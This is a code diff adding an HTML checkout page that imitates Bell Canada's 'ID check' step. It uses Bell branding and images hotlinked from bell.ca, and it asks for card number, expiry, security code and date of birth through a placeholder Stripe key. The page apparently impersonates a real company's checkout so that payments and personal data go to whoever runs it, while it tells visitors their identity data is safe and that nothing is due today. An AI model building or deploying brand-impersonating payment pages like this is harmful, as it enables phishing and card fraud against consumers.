@@ -1,0 +1,295 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Setup &amp; verification | Checkout | Bell Canada</title>
+  <link rel="stylesheet" href="/styles.css">
+  <script src="https://js.stripe.com/v3/"></script>
+</head>
+<body>
+  <header class="header">
+    <div class="container">
+      <div class="header-content">
+        <a href="/" class="logo">Bell</a>
+        <div>
+          <a href="/cart" style="color: white; text-decoration: none;">
+            <span style="margin-right: 8px;">Back to cart</span>
+          </a>
+        </div>
+      </div>
+    </div>
+  </header>
+  
+  <div class="progress-steps">
+    <div class="container">
+      <div class="steps">
+        <div class="step complete">
+          <div class="step-number">✓</div>
+          <div class="step-label">Customer information</div>
+        </div>
+        <div class="step complete">
+          <div class="step-number">✓</div>
+          <div class="step-label">Number setup</div>
+        </div>
+        <div class="step complete">
+          <div class="step-number">✓</div>
+          <div class="step-label">Shipping</div>
+        </div>
+        <div class="step active">
+          <div class="step-number">4</div>
+          <div class="step-label">ID check</div>
+        </div>
+        <div class="step">
+          <div class="step-number">5</div>
+          <div class="step-label">Review & place order</div>
+        </div>
+      </div>
+      
+      <div class="mobile-steps">
+        <span>4/5 - ID check</span>
+      </div>
+    </div>
+  </div>
+  
+  <div class="container">
+    <div class="checkout-container">
+      <div class="checkout-form">
+        <h2>ID check</h2>
+        <p>This information is required for online purchases and is used to verify and protect your identity. We keep this information safe and will not use it for any other purpose.</p>
+        <p>To protect our customers, devices purchased fraudulently from Bell will be disabled.</p>
+        <p>* Required fields</p>
+        
+        <div class="form-section">
+          <div style="display: flex; justify-content: space-between; align-items: center;">
+            <h3>Billing address</h3>
+            <a href="#" style="color: var(--bell-blue); text-decoration: none;">Edit</a>
+          </div>
+          <p>220-885 Georgia St, <br>Vancouver, BC, V6C 3E8</p>
+        </div>
+        
+        <div class="form-section">
+          <div style="display: flex; justify-content: space-between; align-items: center;">
+            <h3>Cardholder name</h3>
+            <a href="#" style="color: var(--bell-blue); text-decoration: none;">Edit</a>
+          </div>
+          <p>Jason Bourne</p>
+        </div>
+
+        <form id="payment-form">
+          <div class="form-section">
+            <div class="form-group">
+              <label for="card-number" class="form-label">
+                <span style="color: #e53935;">*</span> Card number
+              </label>
+              <div id="card-number" class="card-details"></div>
+              <div class="payment-methods">
+                <img src="https://www.bell.ca/Styles/BRF3/content/img/visa.svg" alt="Visa" class="payment-method active-payment">
+                <img src="https://www.bell.ca/Styles/BRF3/content/img/mastercard.png" alt="Mastercard" class="payment-method">
+                <img src="https://www.bell.ca/Styles/BRF3/content/img/Amex.png" alt="American Express" class="payment-method">
+              </div>
+            </div>
+            
+            <div class="form-group">
+              <label class="form-label">
+                <span style="color: #e53935;">*</span> Expiration date
+              </label>
+              <div id="card-expiry" class="card-details"></div>
+            </div>
+            
+            <div class="form-group">
+              <label class="form-label">
+                <span style="color: #e53935;">*</span> Card security code
+              </label>
+              <div id="card-cvc" class="card-details"></div>
+            </div>
+
+            <div class="form-group">
+              <label class="form-label">
+                <span style="color: #e53935;">*</span> Date of Birth
+              </label>
+              <input type="text" id="dob" class="form-control" placeholder="MM/DD/YYYY">
+            </div>
+          </div>
+          
+          <div id="link-authentication-element"></div>
+          
+          <div id="payment-message" class="error" style="display: none;"></div>
+          
+          <button id="submit" class="btn">
+            <div class="spinner" id="spinner"></div>
+            <span id="button-text">Next: Review</span>
+          </button>
+        </form>
+      </div>
+      
+      <div class="order-summary">
+        <h3>Summary</h3>
+        
+        <div class="summary-row">
+          <div class="summary-label">Due monthly</div>
+          <div class="summary-price">$95.21</div>
+        </div>
+        
+        <div style="margin-top: 10px; color: #666; font-size: 14px;">after taxes</div>
+        
+        <div class="summary-row" style="margin-top: 20px;">
+          <div class="summary-label">Due today</div>
+          <div class="summary-price">$0.00</div>
+        </div>
+        
+        <div style="margin-top: 10px; color: #666; font-size: 14px;">after taxes & shipping</div>
+        
+        <div style="margin-top: 30px; background-color: #f4f4f4; padding: 20px; border-radius: 8px;">
+          <h4 style="margin-top: 0;">Your purchase includes:</h4>
+          
+          <div style="display: flex; margin-bottom: 15px;">
+            <div style="width: 30px; color: var(--bell-blue); font-size: 24px; text-align: center;">
+              <span>📊</span>
+            </div>
+            <div style="margin-left: 10px; flex: 1;">
+              <p style="margin: 0; font-size: 14px;">Exclusive online savings - Bonus savings of $70 if you place your online order today<sup>†</sup></p>
+            </div>
+          </div>
+          
+          <div style="display: flex; margin-bottom: 15px;">
+            <div style="width: 30px; color: var(--bell-blue); font-size: 24px; text-align: center;">
+              <span>🚚</span>
+            </div>
+            <div style="margin-left: 10px; flex: 1;">
+              <p style="margin: 0; font-size: 14px;">Fast shipping</p>
+            </div>
+          </div>
+          
+          <div style="display: flex; margin-bottom: 15px;">
+            <div style="width: 30px; color: var(--bell-blue); font-size: 24px; text-align: center;">
+              <span>↩️</span>
+            </div>
+            <div style="margin-left: 10px; flex: 1;">
+              <p style="margin: 0; font-size: 14px;">Hassle-free returns</p>
+            </div>
+          </div>
+          
+          <div style="text-align: center; margin-top: 20px;">
+            <a href="#" style="color: var(--bell-blue); text-decoration: none;">Learn more</a>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+  
+  <script>
+    const stripe = Stripe('pk_test_your_publishable_key'); // Replace with your actual publishable key
+    
+    let elements;
+    
+    initialize();
+    
+    async function initialize() {
+      const response = await fetch("/create-payment-intent", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ }),
+      });
+      
+      const { clientSecret } = await response.json();
+      
+      const appearance = {
+        theme: 'stripe',
+        variables: {
+          colorPrimary: '#00549a',
+        },
+      };
+      
+      elements = stripe.elements({
+        appearance,
+        clientSecret,
+      });
+      
+      // Create and mount the Link Authentication Element
+      const linkAuthenticationElement = elements.create("linkAuthentication");
+      linkAuthenticationElement.mount("#link-authentication-element");
+      
+      // Create and mount the individual card elements
+      const cardNumberElement = elements.create("cardNumber");
+      const cardExpiryElement = elements.create("cardExpiry");
+      const cardCvcElement = elements.create("cardCvc");
+      
+      cardNumberElement.mount("#card-number");
+      cardExpiryElement.mount("#card-expiry");
+      cardCvcElement.mount("#card-cvc");
+      
+      // Handle form submission
+      const form = document.getElementById("payment-form");
+      form.addEventListener("submit", handleSubmit);
+    }
+    
+    async function handleSubmit(e) {
+      e.preventDefault();
+      
+      setLoading(true);
+      
+      const dob = document.getElementById('dob').value;
+      
+      if (!dob) {
+        showMessage("Please enter your date of birth");
+        setLoading(false);
+        return;
+      }
+      
+      const { error } = await stripe.confirmPayment({
+        elements,
+        confirmParams: {
+          return_url: window.location.origin + "/success",
+          payment_method_data: {
+            billing_details: {
+              name: "Jason Bourne",
+              address: {
+                city: "Vancouver",
+                country: "CA",
+                line1: "220-885 Georgia St",
+                postal_code: "V6C 3E8",
+                state: "BC"
+              }
+            },
+          },
+        },
+      });
+      
+      if (error) {
+        if (error.type === "card_error" || error.type === "validation_error") {
+          showMessage(error.message);
+        } else {
+          showMessage("An unexpected error occurred.");
+        }
+        
+        setLoading(false);
+      }
+    }
+    
+    function showMessage(messageText) {
+      const messageContainer = document.getElementById("payment-message");
+      messageContainer.textContent = messageText;
+      messageContainer.style.display = "block";
+      
+      setTimeout(function () {
+        messageContainer.style.display = "none";
+        messageContainer.textContent = "";
+      }, 8000);
+    }
+    
+    function setLoading(isLoading) {
+      if (isLoading) {
+        document.getElementById("submit").disabled = true;
+        document.getElementById("spinner").style.display = "inline";
+        document.getElementById("button-text").style.display = "none";
+      } else {
+        document.getElementById("submit").disabled = false;
+        document.getElementById("spinner").style.display = "none";
+        document.getElementById("button-text").style.display = "inline";
+      }
+    }
+  </script>
+</body>
+</html>
+
